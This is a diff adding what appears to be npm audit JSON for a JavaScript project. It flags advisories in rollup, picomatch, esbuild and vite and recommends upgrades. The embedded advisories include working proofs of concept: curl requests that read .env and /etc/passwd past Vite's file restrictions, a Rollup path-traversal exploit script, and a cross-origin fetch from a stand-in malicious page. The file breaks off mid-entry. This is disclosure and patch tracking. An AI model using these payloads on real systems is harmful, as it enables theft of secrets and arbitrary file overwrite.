@@ -1,0 +1,408 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1113515,
+          "path": ".>vite>rollup",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "rollup",
+      "target": "4.60.2",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115551,
+          "path": ".>lint-staged>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115554,
+          "path": ".>lint-staged>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "picomatch",
+      "target": "4.0.4",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": ".>vitest>vite>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vite",
+      "resolves": [
+        {
+          "id": 1109131,
+          "path": ".>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116229,
+          "path": ".>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116230,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116232,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116235,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.21.5",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": ["CWE-346"],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1109131": {
+      "findings": [
+        {
+          "version": "5.4.20",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7\n- https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed\n- https://nvd.nist.gov/vuln/detail/CVE-2025-62522\n- https://github.com/advisories/GHSA-93m4-6634-74q7",
+      "created": "2025-10-20T19:54:28.000Z",
+      "id": 1109131,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n<img width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" />",
+      "reported_by": null,
+      "title": "vite allows server.fs.deny bypass via backslash on Windows",
+      "metadata": null,
+      "cves": ["CVE-2025-62522"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=5.2.6 <=5.4.20",
+      "github_advisory_id": "GHSA-93m4-6634-74q7",
+      "recommendation": "Upgrade to version 5.4.21 or later",
+      "patched_versions": ">=5.4.21",
+      "updated": "2025-10-21T14:51:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-22"],
+      "url": "https://github.com/advisories/GHSA-93m4-6634-74q7"
+    },
+    "1113515": {
+      "findings": [
+        {
+          "version": "4.52.4",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/rollup/rollup/security/advisories/GHSA-mw96-cpmx-2vgc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27606\n- https://github.com/rollup/rollup/commit/c60770d7aaf750e512c1b2774989ea4596e660b2\n- https://github.com/rollup/rollup/commit/c8cf1f9c48c516285758c1e11f08a54f304fd44e\n- https://github.com/rollup/rollup/commit/d6dee5e99bb82aac0bee1df4ab9efbde455452c3\n- https://github.com/rollup/rollup/releases/tag/v2.80.0\n- https://github.com/rollup/rollup/releases/tag/v3.30.0\n- https://github.com/rollup/rollup/releases/tag/v4.59.0\n- https://github.com/advisories/GHSA-mw96-cpmx-2vgc",
+      "created": "2026-02-25T22:37:26.000Z",
+      "id": 1113515,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nThe Rollup module bundler (specifically v4.x and present in current source) is vulnerable to an Arbitrary File Write via Path Traversal. Insecure file name sanitization in the core engine allows an attacker to control output filenames (e.g., via CLI named inputs, manual chunk aliases, or malicious plugins) and use traversal sequences (`../`) to overwrite files anywhere on the host filesystem that the build process has permissions for. This can lead to persistent Remote Code Execution (RCE) by overwriting critical system or user configuration files.\n\n### Details\nThe vulnerability is caused by the combination of two flawed components in the Rollup core:\n\n1.  **Improper Sanitization**: In `src/utils/sanitizeFileName.ts`, the `INVALID_CHAR_REGEX` used to clean user-provided names for chunks and assets excludes the period (`.`) and forward/backward slashes (`/`, `\\`). \n    ```typescript\n    // src/utils/sanitizeFileName.ts (Line 3)\n    const INVALID_CHAR_REGEX = /[\\u0000-\\u001F\"#$%&*+,:;<=>?[\\]^`{|}\\u007F]/g;\n    ```\n    This allows path traversal sequences like `../../` to pass through the sanitizer unmodified.\n\n2.  **Unsafe Path Resolution**: In `src/rollup/rollup.ts`, the `writeOutputFile` function uses `path.resolve` to combine the output directory with the \"sanitized\" filename.\n    ```typescript\n    // src/rollup/rollup.ts (Line 317)\n    const fileName = resolve(outputOptions.dir || dirname(outputOptions.file!), outputFile.fileName);\n    ```\n    Because `path.resolve` follows the `../` sequences in `outputFile.fileName`, the resulting path points outside of the intended output directory. The subsequent call to `fs.writeFile` completes the arbitrary write.\n\n### PoC\nA demonstration of this vulnerability can be performed using the Rollup CLI or a configuration file.\n\n**Scenario: CLI Named Input Exploit**\n1.  Target a sensitive file location (for demonstration, we will use a file in the project root called `pwned.js`).\n2.  Execute Rollup with a specifically crafted named input where the key contains traversal characters:\n    ```bash\n    rollup --input \"a/../../pwned.js=main.js\" --dir dist\n    ```\n3.  **Result**: Rollup will resolve the output path for the entry chunk as `dist + a/../../pwned.js`, which resolves to the project root. The file `pwned.js` is created/overwritten outside the `dist` folder.\n\n**Reproduction Files provided :**\n*   `vuln_app.js`: Isolated logic exactly replicating the sanitization and resolution bug.\n*   `exploit.py`: Automated script to run the PoC and verify the file escape.\n\nvuln_app.js\n```js\nconst path = require('path');\nconst fs = require('fs');\n\n/**\n * REPLICATED ROLLUP VULNERABILITY\n * \n * 1. Improper Sanitization (from src/utils/sanitizeFileName.ts)\n * 2. Unsafe Path Resolution (from src/rollup/rollup.ts)\n */\n\nfunction sanitize(name) {\n    // The vulnerability: Rollup's regex fails to strip dots and slashes, \n    // allowing path traversal sequences like '../'\n    return name.replace(/[\\u0000-\\u001F\"#$%&*+,:;<=>?[\\]^`{|}\\u007F]/g, '_');\n}\n\nasync function build(userSuppliedName) {\n    const outputDir = path.join(__dirname, 'dist');\n    const fileName = sanitize(userSuppliedName);\n\n    // Vulnerability: path.resolve() follows traversal sequences in the filename\n    const outputPath = path.resolve(outputDir, fileName);\n\n    console.log(`[*] Target write path: ${outputPath}`);\n\n    if (!fs.existsSync(path.dirname(outputPath))) {\n        fs.mkdirSync(path.dirname(outputPath), { recursive: true });\n    }\n\n    fs.writeFileSync(outputPath, 'console.log(\"System Compromised!\");');\n    console.log(`[+] File written successfully.`);\n}\n\nbuild(process.argv[2] || 'bundle.js');\n\n```\n\nexploit.py\n```py\nimport subprocess\nfrom pathlib import Path\n\ndef run_poc():\n    # Target a file outside the 'dist' folder\n    poc_dir = Path(__file__).parent\n    malicious_filename = \"../pwned_by_rollup.js\"\n    target_path = poc_dir / \"pwned_by_rollup.js\"\n\n    print(f\"=== Rollup Path Traversal PoC ===\")\n    print(f\"[*] Malicious Filename: {malicious_filename}\")\n    \n    # Trigger the vulnerable app\n    subprocess.run([\"node\", \"poc/vuln_app.js\", malicious_filename])\n\n    if target_path.exists():\n        print(f\"[SUCCESS] File escaped 'dist' folder!\")\n        print(f\"[SUCCESS] Created: {target_path}\")\n        # target_path.unlink() # Cleanup\n    else:\n        print(\"[FAILED] Exploit did not work.\")\n\nif __name__ == \"__main__\":\n    run_poc()\n```\n\n## POC \n```rollup --input \"bypass/../../../../../../../Users/vaghe/OneDrive/Desktop/pwned_desktop.js=main.js\" --dir dist```\n\n<img width=\"1918\" height=\"1111\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3474eb7c-9c4b-4acd-9103-c70596b490d4\" />\n\n\n\n### Impact\nThis is a **High** level of severity vulnerability.\n*   **Arbitrary File Write**: Attackers can overwrite sensitive files like `~/.ssh/authorized_keys`, `.bashrc`, or system binaries if the build process has sufficient privileges.\n*   **Supply Chain Risk**: Malicious third-party plugins or dependencies can use this to inject malicious code into other parts of a developer's machine during the build phase.\n*   **User Impact**: Developers running builds on untrusted repositories are at risk of system compromise.",
+      "reported_by": null,
+      "title": "Rollup 4 has Arbitrary File Write via Path Traversal",
+      "metadata": null,
+      "cves": ["CVE-2026-27606"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "rollup",
+      "vulnerable_versions": ">=4.0.0 <4.59.0",
+      "github_advisory_id": "GHSA-mw96-cpmx-2vgc",
+      "recommendation": "Upgrade to version 4.59.0 or later",
+      "patched_versions": ">=4.59.0",
+      "updated": "2026-02-25T22:37:27.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-22"],
+      "url": "https://github.com/advisories/GHSA-mw96-cpmx-2vgc"
+    },
+    "1115551": {
+      "findings": [
+        {
+          "version": "4.0.3",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-3v7f-55p6-f55p\n- https://github.com/micromatch/picomatch/commit/4516eb521f13a46b2fe1a1d2c9ef6b20ddc0e903\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33672\n- https://github.com/advisories/GHSA-3v7f-55p6-f55p",
+      "created": "2026-03-25T21:13:39.000Z",
+      "id": 1115551,
+      "npm_advisory_id": null,
+      "overview": "### Impact\npicomatch is vulnerable to a **method injection vulnerability (CWE-1321)** affecting the `POSIX_REGEX_SOURCE` object. Because the object inherits from `Object.prototype`, specially crafted POSIX bracket expressions (e.g., `[[:constructor:]]`) can reference inherited method names. These methods are implicitly converted to strings and injected into the generated regular expression.\n\nThis leads to **incorrect glob matching behavior (integrity impact)**, where patterns may match unintended filenames. The issue does **not enable remote code execution**, but it can cause security-relevant logic errors in applications that rely on glob matching for filtering, validation, or access control.\n\nAll users of affected `picomatch` versions that process untrusted or user-controlled glob patterns are potentially impacted.\n\n### Patches\n\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to picomatch.\n\nPossible mitigations include:\n- Sanitizing or rejecting untrusted glob patterns, especially those containing POSIX character classes like `[[:...:]]`.\n- Avoiding the use of POSIX bracket expressions if user input is involved.\n- Manually patching the library by modifying `POSIX_REGEX_SOURCE` to use a null prototype:\n\n  ```js\n  const POSIX_REGEX_SOURCE = {\n    __proto__: null,\n    alnum: 'a-zA-Z0-9',\n    alpha: 'a-zA-Z',\n    // ... rest unchanged\n  };\n  \n### Resources\n\n- fix for similar issue: https://github.com/micromatch/picomatch/pull/144\n- picomatch repository https://github.com/micromatch/picomatch",
+      "reported_by": null,
+      "title": "Picomatch: Method Injection in POSIX Character Classes causes incorrect Glob Matching",
+      "metadata": null,
+      "cves": ["CVE-2026-33672"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "picomatch",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-3v7f-55p6-f55p",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-03-27T21:36:25.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": ["CWE-1321"],
+      "url": "https://github.com/advisories/GHSA-3v7f-55p6-f55p"
+    },
+    "1115554": {
+      "findings": [
+        {
+          "version": "4.0.3",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-c2c7-rcm5-vvqj\n- https://github.com/micromatch/picomatch/commit/5eceecd27543b8e056b9307d69e105ea03618a7d\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33671\n- https://github.com/advisories/GHSA-c2c7-rcm5-vvqj",
+      "created": "2026-03-25T21:12:07.000Z",
+      "id": 1115554,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)",
+      "reported_by": null,
+      "title": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+      "metadata": null,
+      "cves": ["CVE-2026-33671"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "picomatch",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-c2c7-rcm5-vvqj",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-03-27T21:36:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": ["CWE-1333"],
+      "url": "https://github.com/advisories/GHSA-c2c7-rcm5-vvqj"
+    },
+    "1116229": {
+      "findings": [
+        {
+          "version": "5.4.20",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-4w7w-66w2-5vf9\n- https://github.com/vitejs/vite/pull/22161\n- https://github.com/vitejs/vite/commit/79f002f2286c03c88c7b74c511c7f9fc6dc46694\n- https://github.com/vitejs/vite/releases/tag/v6.4.2\n- https://github.com/vitejs/vite/releases/tag/v7.3.2\n- https://github.com/vitejs/vite/releases/tag/v8.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39365\n- https://github.com/advisories/GHSA-4w7w-66w2-5vf9",
+      "created": "2026-04-06T18:03:46.000Z",
+      "id": 1116229,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nAny files ending with `.map` even out side the project can be returned to the browser.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- have a sensitive content in files ending with `.map` and the path is predictable\n\n### Details\n\nIn Vite v7.3.1, the dev server’s handling of `.map` requests for optimized dependencies resolves file paths and calls `readFile` without restricting `../` segments in the URL. As a result, it is possible to bypass the [`server.fs.strict`](https://vite.dev/config/server-options#server-fs-strict) allow list and retrieve `.map` files located outside the project root, provided they can be parsed as valid source map JSON.\n\n### PoC\n1. Create a minimal PoC sourcemap outside the project root\n    ```bash\n    cat > /tmp/poc.map <<'EOF'\n    {\"version\":3,\"file\":\"x.js\",\"sources\":[],\"names\":[],\"mappings\":\"\"}\n    EOF\n    ```\n2. Start the Vite dev server (example)\n    ```bash\n    pnpm -C playground/fs-serve dev --host 127.0.0.1 --port 18080\n    ```\n3. Confirm that direct `/@fs` access is blocked by `strict` (returns 403)\n    <img width=\"4004\" height=\"1038\" alt=\"image\" src=\"https://github.com/user-attachments/assets/15a859a8-1dc6-4105-8d58-80527c0dd9ab\" />\n4. Inject `../` segments under the optimized deps `.map` URL prefix to reach `/tmp/poc.map`\n    <img width=\"2790\" height=\"846\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5d02957d-2e6a-4c45-9819-3f024e0e81f2\" />",
+      "reported_by": null,
+      "title": "Vite Vulnerable to Path Traversal in Optimized Deps `.map` Handling",
+      "metadata": null,
+      "cves": ["CVE-2026-39365"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": "<=6.4.1",
+      "github_advisory_id": "GHSA-4w7w-66w2-5vf9",
+      "recommendation": "Upgrade to version 6.4.2 or later",
+      "patched_versions": ">=6.4.2",
+      "updated": "2026-04-07T22:16:29.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-22", "CWE-200"],
+      "url": "https://github.com/advisories/GHSA-4w7w-66w2-5vf9"
+    },
+    "1116230": {
+      "findings": [
+        {
+          "version": "7.3.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-4w7w-66w2-5vf9\n- https://github.com/vitejs/vite/pull/22161\n- https://github.com/vitejs/vite/commit/79f002f2286c03c88c7b74c511c7f9fc6dc46694\n- https://github.com/vitejs/vite/releases/tag/v6.4.2\n- https://github.com/vitejs/vite/releases/tag/v7.3.2\n- https://github.com/vitejs/vite/releases/tag/v8.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39365\n- https://github.com/advisories/GHSA-4w7w-66w2-5vf9",
+      "created": "2026-04-06T18:03:46.000Z",
+      "id": 1116230,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nAny files ending with `.map` even out side the project can be returned to the browser.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- have a sensitive content in files ending with `.map` and the path is predictable\n\n### Details\n\nIn Vite v7.3.1, the dev server’s handling of `.map` requests for optimized dependencies resolves file paths and calls `readFile` without restricting `../` segments in the URL. As a result, it is possible to bypass the [`server.fs.strict`](https://vite.dev/config/server-options#server-fs-strict) allow list and retrieve `.map` files located outside the project root, provided they can be parsed as valid source map JSON.\n\n### PoC\n1. Create a minimal PoC sourcemap outside the project root\n    ```bash\n    cat > /tmp/poc.map <<'EOF'\n    {\"version\":3,\"file\":\"x.js\",\"sources\":[],\"names\":[],\"mappings\":\"\"}\n    EOF\n    ```\n2. Start the Vite dev server (example)\n    ```bash\n    pnpm -C playground/fs-serve dev --host 127.0.0.1 --port 18080\n    ```\n3. Confirm that direct `/@fs` access is blocked by `strict` (returns 403)\n    <img width=\"4004\" height=\"1038\" alt=\"image\" src=\"https://github.com/user-attachments/assets/15a859a8-1dc6-4105-8d58-80527c0dd9ab\" />\n4. Inject `../` segments under the optimized deps `.map` URL prefix to reach `/tmp/poc.map`\n    <img width=\"2790\" height=\"846\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5d02957d-2e6a-4c45-9819-3f024e0e81f2\" />",
+      "reported_by": null,
+      "title": "Vite Vulnerable to Path Traversal in Optimized Deps `.map` Handling",
+      "metadata": null,
+      "cves": ["CVE-2026-39365"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.1",
+      "github_advisory_id": "GHSA-4w7w-66w2-5vf9",
+      "recommendation": "Upgrade to version 7.3.2 or later",
+      "patched_versions": ">=7.3.2",
+      "updated": "2026-04-07T22:16:29.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-22", "CWE-200"],
+      "url": "https://github.com/advisories/GHSA-4w7w-66w2-5vf9"
+    },
+    "1116232": {
+      "findings": [
+        {
+          "version": "7.3.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-v2wj-q39q-566r\n- https://github.com/vitejs/vite/pull/22160\n- https://github.com/vitejs/vite/commit/a9a3df299378d9cbc5f069e3536a369f8188c8ff\n- https://github.com/vitejs/vite/releases/tag/v7.3.2\n- https://github.com/vitejs/vite/releases/tag/v8.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39364\n- https://github.com/advisories/GHSA-v2wj-q39q-566r",
+      "created": "2026-04-06T18:03:32.000Z",
+      "id": 1116232,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe contents of files that are specified by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- the sensitive file exists in the allowed directories specified by [`server.fs.allow`](https://vite.dev/config/server-options#server-fs-allow)\n- the sensitive file is denied with a pattern that matches a file by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)\n\n### Details\n\nOn the Vite dev server, files that should be blocked by `server.fs.deny` (e.g., `.env`, `*.crt`) can be retrieved with HTTP 200 responses when query parameters such as `?raw`, `?import&raw`, or `?import&url&inline` are appended.\n\n### PoC\n\n1. Start the dev server: `pnpm exec vite root --host 127.0.0.1 --port 5175 --strictPort`\n2. Confirm that `server.fs.deny` is enforced (expect 403): `curl -i http://127.0.0.1:5175/src/.env | head -n 20`\n   <img width=\"3944\" height=\"1092\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ecb9f2e0-e08f-4ac7-b194-e0f988c4cd4f\" />\n3. Confirm that the same files can be retrieved with query parameters (expect 200):\n   <img width=\"2014\" height=\"373\" alt=\"image\" src=\"https://github.com/user-attachments/assets/76bc2a6a-44f4-4161-ae47-eab5ae0c04a8\" />",
+      "reported_by": null,
+      "title": "Vite: `server.fs.deny` bypassed with queries",
+      "metadata": null,
+      "cves": ["CVE-2026-39364"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.1.0 <=7.3.1",
+      "github_advisory_id": "GHSA-v2wj-q39q-566r",
+      "recommendation": "Upgrade to version 7.3.2 or later",
+      "patched_versions": ">=7.3.2",
+      "updated": "2026-04-07T22:16:19.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-180", "CWE-284"],
+      "url": "https://github.com/advisories/GHSA-v2wj-q39q-566r"
+    },
+    "1116235": {
+      "findings": [
+        {
+          "version": "7.3.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-p9ff-h696-f583\n- https://github.com/vitejs/vite/pull/22159\n- https://github.com/vitejs/vite/commit/f02d9fde0b195afe3ea2944414186962fbbe41e0\n- https://github.com/vitejs/vite/releases/tag/v6.4.2\n- https://github.com/vitejs/vite/releases/tag/v7.3.2\n- https://github.com/vitejs/vite/releases/tag/v8.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39363\n- https://github.com/advisories/GHSA-p9ff-h696-f583",
+      "created": "2026-04-06T18:03:24.000Z",
+      "id": 1116235,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n[`server.fs`](https://vite.dev/config/server-options#server-fs-strict) check was not enforced to the `fetchModule` method that is exposed in Vite dev server's WebSocket. \n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- WebSocket is not disabled by `server.ws: false`\n\nArbitrary files on the server (development machine, CI environment, container, etc.) can be exposed.\n\n### Details\n\nIf it is possible to connect to the Vite dev server’s WebSocket **without an `Origin` header**, an attacker can invoke `fetchModule` via the custom WebSocket event `vite:invoke` and combine `file://...` with `?raw` (or `?inline`) to retrieve the contents of arbitrary files on the server as a JavaScript string (e.g., `export default \"...\"`).\n\nThe access control enforced in the HTTP request path (such as `server.fs.allow`) is not applied to this WebSocket-based execution path.\n\n### PoC\n\n1. Start the dev server on the target \n   Example (used during validation with this repository):\n   ```bash\n   pnpm -C playground/alias exec vite --host 0.0.0.0 --port 5173\n   ```\n\n2. Confirm that access is blocked via the HTTP path (example: arbitrary file)\n   ```bash\n   curl -i 'http://localhost:5173/@fs/etc/passwd?raw'\n   ```\n   Result: `403 Restricted` (outside the allow list)\n   <img width=\"3898\" height=\"1014\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f6593377-549c-45d7-b562-5c19833438af\" />\n\n3. Confirm that the same file can be retrieved via the WebSocket path\n   By connecting to the HMR WebSocket without an `Origin` header and sending a `vite:invoke` request that calls `fetchModule` with a `file://...` URL and `?raw`, the file contents are returned as a JavaScript module.\n  <img width=\"1049\" height=\"296\" alt=\"image\" src=\"https://github.com/user-attachments/assets/af969f7b-d34e-4af4-8adb-5e2b83b31972\" />\n  <img width=\"1382\" height=\"955\" alt=\"image\" 